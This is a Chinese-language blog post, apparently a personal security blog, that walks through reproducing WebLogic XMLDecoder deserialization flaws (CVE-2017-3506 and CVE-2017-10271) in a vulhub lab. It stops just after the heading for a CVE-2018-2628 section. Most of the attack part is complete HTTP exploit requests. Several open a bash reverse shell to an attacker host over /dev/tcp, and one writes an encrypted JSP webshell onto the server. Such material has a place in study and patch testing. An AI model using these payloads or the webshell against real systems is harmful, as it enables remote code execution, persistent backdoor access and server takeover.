<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Weblogic 常见漏洞汇总 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Weblogic 常见漏洞汇总" />
<meta property="og:description" content="WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。
WebLogic XMLDecoder反序列化漏洞（CVE-2017-3506） 0x00 漏洞描述 网上爆出weblogic的WLS组件存在xmldecoder反序列化漏洞，直接post构造的xml数据包即可rce。
0x01 受影响WebLogic版本 10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。
0x02 漏洞复现 靶机IP：192.168.190.136
攻击机：192.168.190.1
可能存在漏洞路径
/wls-wsat/CoordinatorPortType，/wls-wsat/RegistrationPortTypeRPC,
/wls-wsat/ParticipantPortType，/wls-wsat/RegistrationRequesterPortType，
/wls-wsat/CoordinatorPortType11，/wls-wsat/RegistrationPortTypeRPC11，
/wls-wsat/ParticipantPortType11，/wls-wsat/RegistrationRequesterPortType11
1、使用vulhub搭建环境，并启动
切换到 /opt/vulhub/weblogic/CVE-2017-10271/ 目录下
执行 docker-compose up -d
2、访问 http://192.168.190.136:7001/wls-wsat/RegistrationRequesterPortType ，响应出现 Web Services证明存在该漏洞。
执行反弹shell命令
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1 Host: 192.168.190.136:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: text/xml Content-Length: 841 &lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/6a494c6213ca9caf8380b441c99182d8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-20T17:39:10+08:00" />
<meta property="article:modified_time" content="2022-04-20T17:39:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Weblogic 常见漏洞汇总</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p> 
<h3><a id="WebLogic_XMLDecoderCVE20173506_1"></a>WebLogic XMLDecoder反序列化漏洞（CVE-2017-3506）</h3> 
<h4><a id="0x00__2"></a>0x00 漏洞描述</h4> 
<p>网上爆出weblogic的WLS组件存在xmldecoder反序列化漏洞，直接post构造的xml数据包即可rce。</p> 
<h4><a id="0x01_WebLogic_4"></a>0x01 受影响WebLogic版本</h4> 
<p>10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。</p> 
<h4><a id="0x02__6"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1</p> 
 <p>可能存在漏洞路径<br> /wls-wsat/CoordinatorPortType，/wls-wsat/RegistrationPortTypeRPC,<br> /wls-wsat/ParticipantPortType，/wls-wsat/RegistrationRequesterPortType，<br> /wls-wsat/CoordinatorPortType11，/wls-wsat/RegistrationPortTypeRPC11，<br> /wls-wsat/ParticipantPortType11，/wls-wsat/RegistrationRequesterPortType11</p> 
</blockquote> 
<p>1、使用vulhub搭建环境，并启动<br> 切换到<code> /opt/vulhub/weblogic/CVE-2017-10271/</code> 目录下<br> 执行 <code>docker-compose up -d</code><br> 2、访问 <a href="http://192.168.190.136:7001/wls-wsat/RegistrationRequesterPortType" rel="nofollow">http://192.168.190.136:7001/wls-wsat/RegistrationRequesterPortType</a> ，响应出现 Web Services证明存在该漏洞。<br> <img src="https://images2.imgbox.com/c8/61/fZCYJoT9_o.png" alt="image.png"><br> <strong>执行反弹shell命令</strong></p> 
<pre><code class="prism language-xml">POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: 192.168.190.136:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 841

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
								<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
								<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/192.168.190.1/4444 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p><img src="https://images2.imgbox.com/8b/66/1es0NsdP_o.png" alt="image.png"><br> <code>nc 监听 4444端口接收 bash shell</code><br> <img src="https://images2.imgbox.com/e4/0c/cLw4LmDU_o.png" alt="image.png"></p> 
<h3><a id="WebLogic_XMLDecoderCVE201710271_62"></a>WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</h3> 
<h4><a id="0x00__63"></a>0x00 漏洞描述</h4> 
<p>CVE-2017-10271是对CVE-2017-3506 的补丁绕过，将 object 替换成 void。</p> 
<h4><a id="0x01_WebLogic_65"></a>0x01 受影响WebLogic版本</h4> 
<p>10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。</p> 
<h4><a id="0x02__67"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1</p> 
</blockquote> 
<p>1、使用vulhub搭建环境，并启动<br> 切换到<code> /opt/vulhub/weblogic/CVE-2017-10271/</code> 目录下<br> 执行 <code>docker-compose up -d</code><br> 2、访问http://192.168.190.1:7001/wls-wsat/CoordinatorPortType 响应出现 Web Services证明存在该漏洞<br> <img src="https://images2.imgbox.com/1c/9e/kvN6YIQ1_o.png" alt=""> 3、开始复现<br> 访问 http://192.168.190.136:7001/wls-wsat/CoordinatorPortType 使用POST方法发送特定的xml数据，可以实现各种命令执行。<br> <strong>尝试写入文件</strong><br> <strong>请求包</strong></p> 
<pre><code class="prism language-xml">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.190.136:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 705

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.6.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.io.PrintWriter<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>println<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>xmldecoder_vul_test11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>close<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>注意这里的类型不能丢，返回500状态码，即执行成功。<img src="https://images2.imgbox.com/c5/80/Xpr390Mk_o.png" alt="image.png"><br> <img src="https://images2.imgbox.com/18/3d/tXNRWjpL_o.png" alt=""><br> <strong>写shell</strong></p> 
<pre><code class="prism language-xml">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.190.136:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 1154

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.io.PrintWriter<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/shell1.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>println<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>
     <span class="token cdata">&lt;![CDATA[
  &lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="b8a7336f1f7528e1";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
     ]]&gt;</span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>close<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p><strong>连shell <strong><a href="http://192.168.190.136:7001/wls-wsat/shell1.jsp" rel="nofollow">http://192.168.190.136:7001/wls-wsat/shell1.jsp</a><br> <img src="https://images2.imgbox.com/0d/a4/P3xil0Fg_o.png" alt=""></strong> 执行反弹shell</strong></p> 
<pre><code class="prism language-xml">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.190.136:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 641

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/192.168.190.1/4444 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p><code>nc -lvp 4444 监听</code><br> <img src="https://images2.imgbox.com/f4/4a/23LjT0jc_o.png" alt=""><br> 参考连接：<a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" rel="nofollow">https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html</a></p> 
<h2><a id="Weblogic_T3CVE20182628_181"></a>Weblogic T3协议反序列化(CVE-2018-2628)漏洞</h2> 
<h4><a id="0x00__182"></a>0x00 漏洞描述</h4> 
<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。</p> 
<h4><a id="0x01_WebLogic_184"></a>0x01 受影响WebLogic版本</h4> 
<p>Weblogic 10.3.6.0<br> Weblogic 12.1.3.0<br> Weblogic 12.2.1.2<br> Weblogic 12.2.1.3</p> 
<h4><a id="0x02__189"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1 192.168.190.131</p> 
</blockquote> 
<p>1、漏洞检测</p> 
